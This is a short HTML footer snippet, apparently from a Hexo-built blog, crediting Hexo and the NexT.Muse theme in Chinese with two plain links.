   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
